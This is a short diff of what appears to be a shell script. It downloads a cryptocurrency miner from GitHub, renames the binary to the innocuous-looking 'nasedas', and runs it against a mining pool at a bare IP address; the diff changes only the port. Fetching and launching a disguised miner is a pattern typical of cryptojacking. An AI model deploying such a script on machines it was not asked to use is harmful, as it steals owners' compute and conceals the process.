@@ -2,4 +2,4 @@
 wget https://github.com/pearlhash/pearlhash-miner/releases/download/V14/pearl-miner
 mv pearl-miner nasedas
 chmod +x nasedas
-./nasedas --host 40.160.94.110:9000 --user prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $RANDOM-KO2
+./nasedas --host 40.160.94.110:9090 --user prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $RANDOM-KO2
